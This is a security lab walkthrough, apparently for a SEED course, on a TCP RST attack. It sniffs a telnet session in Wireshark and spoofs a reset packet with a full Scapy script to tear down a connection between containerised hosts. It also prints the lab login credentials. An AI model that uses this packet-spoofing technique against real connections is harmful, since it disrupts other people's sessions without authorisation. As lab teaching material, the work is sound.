# TCP RST Attacks on telnet Connections

The TCP RST Attack can terminate an established TCP connection between two victims: User 1 (IP 10.9.0.6) and Victim Machine (IP 10.9.0.5). The objective of this exercise is to create one forged TCP RST (Reset) packet that looks like it came from the legitimate Telnet client - User 1 (IP 10.9.0.6). The goal is to make the existing Telnet connection close/break.

## Assumptions
- In this lab, we have three machines
      - 1 attacker machine: seed-attacker (10.9.0.1)
      - 1 victim machine: IP Address - 10.9.0.5
      - 1 user machine: IP address - 10.9.0.6
- We use containers to set up the lab environment
- The attacker can observe the TCP traffic between A and B.
- All these machines are on the same LAN

### Try to connect as User1

1) Open a new terminal and execute the following command. You are now inside the Normal User 1 machine, 10.9.0.6.

  ```javascript
  docksh db8
  ```

2) Insider the User 1 container, attempt to connect to the Victim Machine (10.9.0.5).

  ```javascript
  telnet 10.9.0.5
  ```

3) Log in 

  ```javascript
  login: seed
  Password: dees
  ```

<img width="824" height="473" alt="image" src="https://github.com/user-attachments/assets/a1f66eb2-41b2-435a-8e61-2df84233debf" />

4) The Telnet session remains open and interactive. We need it to remain ESTABLISHED while we capture the packet.

### Open Wireshark on the VM
5) Open Wireshark on the VM

6) Find the correct network interface. In the VM Machine, type:

  ```javascript
  ip addr | grep -B2 -A2 "10.9.0.1"
  ```
<img width="911" height="333" alt="image" src="https://github.com/user-attachments/assets/99036e58-94b2-485c-90a8-53aaba2beb81" />

7) Within Wireshark, search for this interface: br-c84de5716c52 and click **Start**

<img width="1597" height="387" alt="image" src="https://github.com/user-attachments/assets/10c2df96-6d5c-4326-a707-b944ce089815" />

8) In the Wireshark filter box, enter:

  ```javascript
  tcp.port == 23
  ```

<img width="1054" height="798" alt="image" src="https://github.com/user-attachments/assets/a5a4b911-b541-437f-85cd-03ff1e438bf3" />


9) Narrow it further to only show TCP port 23 packets going from User 1 to the Victim.. Once you see traffic, use:

  ```javascript
  ip.src == 10.9.0.6 && ip.dst == 10.9.0.5 && tcp.port == 23
  ```


10) Next, select the last packet from the established Telnet connection going from User 1 (10.9.0.6) to the Victim (10.9.0.5).

### Create your RST packet

11) Return to you VM terminal and create a file with:

  ```javascript
  nano tcprst.py
  ```


<img width="792" height="124" alt="image" src="https://github.com/user-attachments/assets/ab868238-d703-4fb1-90c8-55597490f69b" />

12)  Paste the following:
 
  ```javascript
  #!/usr/bin/env python3
from scapy.all import *

# Task 2: TCP RST Attack
# Values copied from Wireshark Frame 11

ip = IP(src="10.9.0.6", dst="10.9.0.5") # src="10.9.0.6" - we pretend to be User 1 | dst = "10.9.0.5" - we're sending the forged packet to the Victim/Telnet server

tcp = TCP(
    sport=53446, #  User 1's temporary TCP port for this Telnet connection.
    dport=23, # Victim/Telnet server uses TCP port 23
    flags="R", # R means TCP Reset.
    seq=3608199035, # These are the TCP sequence/acknowledgment values you copied from Wireshark.
)

pkt = ip/tcp

ls(pkt)
send(pkt, verbose=0)
  ```

<img width="1596" height="898" alt="image" src="https://github.com/user-attachments/assets/41a82d0a-9f92-4798-88e5-016b9613822b" />


13) Save it with 

  ```javascript
  Ctrl + O
File Name to Write: /home/seed/tcprst.py
Enter
Ctrl + X
  ```


14) Back in the VM terminal, because Scapy needs permission to send a crafted packet, run:

  ```javascript
  sudo python3 /home/seed/tcprst.py
  ```

Conclusion:

<img width="1599" height="899" alt="image" src="https://github.com/user-attachments/assets/9a5d7554-fde8-4f3a-b661-8056f19462d4" />

